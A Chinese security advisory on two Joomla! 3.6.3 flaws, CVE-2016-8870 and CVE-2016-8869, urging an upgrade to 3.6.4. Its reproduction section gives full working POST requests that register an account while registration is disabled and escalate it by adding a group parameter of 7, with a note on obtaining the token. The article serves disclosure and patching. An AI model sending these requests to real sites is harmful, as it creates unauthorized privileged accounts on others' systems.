> 原文链接: https://www.anquanke.com//post/id/84796 


# 【漏洞预警】Joomla!存在未授权创建账号/权限提升漏洞请及时更新


                                阅读量   
                                **114378**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01889cfeed57f6f586.jpg)](https://p5.ssl.qhimg.com/t01889cfeed57f6f586.jpg)

**漏洞描述**

**账号创建（Account Creation）**

**影响版本：**3.4.4到3.6.3

**报告日期：**2016年10月18号

**修复日期：**2016年10月25号

**CVE编号：**CVE-2016-8870

**描述：**不严格的检查允许用户在网站不允许注册的时候注册账号

**修复建议：**升级到Joomla!3.6.4版本

**权限提升（Elevated Privileges）**

**影响版本：**3.4.4到3.6.3

**报告日期：**2016年10月18号

**修复日期：**2016年10月25号

**CVE编号：**CVE-2016-8869

**描述：**不恰当的使用未经严格的数据导致已注册账号可以提升权限

**修复建议：**升级到Joomla!3.6.4版本

<br>

**安全客表示将持续关注该漏洞并及时跟进最新信息。**

<br>

**25号Joomla!官方公告**

Joomla! 3.6.4现在已经可以下载了。这是一个3.x版本的安全更新。修复了2个关键的安全问题和一个双因子认证的bug。我们强烈的建议你里立即更新你的网站。

**21号Joomla!官方公告**

在10月25号14:00 UTC（北京时间约22:00）即将发布Joomla! 3.6.4版本（包含一个重要安全问题的修复），Joomla!的Strike Team安全团队(JSST)确认了这个安全问题。

这是一个非常重要的安全问题修复，请在下周二准备好去更新你的Joomla!。

请理解我们，直到这个版本发布之前，我们不会透漏关于这个漏洞的任何信息。

**<br>**

**账号创建（Account Creation）复现过程**

**<strong>**</strong>

下载受漏洞影响版本3.6.3并部署，关闭用户注册模块。下载地址

```
https://github.com/joomla/joomla-cms/releases/download/3.6.3/Joomla_3.6.3-Stable-Full_Package.tar.gz
```

查看官方修复后的版本3.6.4改动后的代码

```
https://github.com/joomla/joomla-cms/commit/bae1d43938c878480cfd73671e4945211538fdcf
```

我们发现components/com_users/controllers/user.php文件中，删除了大量的代码

根据删掉代码里的逻辑，这里并没有检测用户能否注册的权限，我们提交下面的POST请求，即可完成未授权注册用户。

[![](https://p2.ssl.qhimg.com/t01d6f3633f02055cd0.jpg)](https://p2.ssl.qhimg.com/t01d6f3633f02055cd0.jpg)

为方便大家复现，参考数据包如下

```
POST /index.php?option=com_users&amp;task=user.register HTTP/1.1
Host: localhost
Referer: localhost/index.php/component/users/?view=registration
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydPTUbyuhuekYdsD4
Cookie: 16ff61c719338342d4ec65bab8753e6f=g513vf2aandq0dn8fjtcreu523
Connection: close
Content-Length: 1032

------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[name]"

secknight
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[username]"

secknight
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[password1]"

password
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[password2]"

password
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[email1]"

email@test.com
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[email2]"

email@test.com
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="option"

com_users
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="task"

user.register
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="671f11e3d1d883f57f8b30e2a2359523"

1
------WebKitFormBoundarydPTUbyuhuekYdsD4--
```

这里需要注意需要token安全验证，token可以通过index页面的login处获取。

[![](https://p1.ssl.qhimg.com/t01cddecaa604292d0d.jpg)](https://p1.ssl.qhimg.com/t01cddecaa604292d0d.jpg)

登陆管理员后台查看用户信息，发现新用户secknight,请注意权限。

[![](https://p4.ssl.qhimg.com/t01d0fafa320b2e7d50.jpg)](https://p4.ssl.qhimg.com/t01d0fafa320b2e7d50.jpg)

前台登陆测试。

[![](https://p1.ssl.qhimg.com/t015613c902f1a4dd45.jpg)](https://p1.ssl.qhimg.com/t015613c902f1a4dd45.jpg)

**权限提升（Elevated Privileges）**

****

对于权限提升，只需要在未授权创建账号的请求数据包中加入user[groups][]参数，值为7。即可成功注册，但是仍旧是没有激活的用户。

```
POST /index.php?option=com_users&amp;task=user.register HTTP/1.1
Host: localhost
Referer: localhost/index.php/component/users/?view=registration
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydPTUbyuhuekYdsD4
Cookie: 16ff61c719338342d4ec65bab8753e6f=g513vf2aandq0dn8fjtcreu523
Connection: close
Content-Length: 1032
 
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[name]"
 
secknight1
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[username]"
 
secknight1
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[password1]"
 
password
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[password2]"
 
password
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[email1]"
 
email1@test.com
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[email2]"
 
email1@test.com
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="user[groups][]"
 
7
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="option"
 
com_users
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="task"
 
user.register
------WebKitFormBoundarydPTUbyuhuekYdsD4
Content-Disposition: form-data; name="671f11e3d1d883f57f8b30e2a2359523"
 
1
------WebKitFormBoundarydPTUbyuhuekYdsD4--
```



**参考链接**

[https://www.joomla.org/announcements/release-news/5678-joomla-3-6-4-released.html](https://www.joomla.org/announcements/release-news/5678-joomla-3-6-4-released.html)

[https://www.joomla.org/announcements/release-news/5677-important-security-announcement-pre-release-364.html](https://www.joomla.org/announcements/release-news/5677-important-security-announcement-pre-release-364.html)

[https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html](https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html)

[https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html](https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html)

[https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2#.1kmt2f495](https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2#.1kmt2f495) 


